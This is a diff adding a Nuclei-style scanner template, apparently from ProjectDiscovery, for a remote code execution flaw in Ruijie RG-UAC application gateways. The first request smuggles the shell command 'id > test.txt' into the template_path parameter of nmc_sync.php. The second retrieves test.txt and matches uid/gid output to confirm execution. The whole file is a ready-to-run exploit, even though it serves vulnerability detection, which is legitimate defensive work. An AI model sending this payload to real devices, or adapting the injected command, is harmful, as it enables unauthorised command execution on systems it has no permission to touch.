@@ -1,0 +1,42 @@
+id: ruijie-rg-uac-rce
+info:
+  name: Ruijie RG-UAC Application Gateway RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploit for Ruijie RG-UAC Application Gateway Remote Code Execution vulnerability.
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|id%20>test.txt|cat"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "IP_Strict"
+        part: body
+      - type: word
+        words:
+          - "alert(\"OK!\");"
+        part: body
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/view/systemConfig/management/test.txt"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
